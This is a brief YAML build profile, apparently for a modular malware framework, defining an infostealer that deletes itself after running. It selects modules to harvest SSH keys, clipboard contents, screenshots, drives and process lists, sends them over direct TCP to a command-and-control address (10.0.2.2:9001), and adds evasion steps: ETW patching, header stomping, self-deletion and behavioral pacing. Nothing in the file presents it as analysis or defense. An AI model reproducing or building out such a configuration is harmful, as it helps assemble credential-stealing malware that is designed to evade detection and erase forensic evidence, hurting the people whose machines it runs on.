name: infostealer_self_delete
description: Infostealer that deletes itself from disk after execution — zero forensic trace

core:
  - core/emit_buffer
  - core/file_ops

collectors:
  - collectors/system_info_api
  - collectors/processes
  - collectors/clipboard
  - collectors/drives
  - collectors/ssh_keys
  - collectors/screenshot

exfil: exfil/tcp_direct
arch: arch/sequential

evasion:
  - evasion/etw_patch
  - evasion/header_stomp
  - evasion/self_delete
  - evasion/behavioral_pacing

vars:
  C2_IP: "10.0.2.2"
  C2_PORT: "9001"
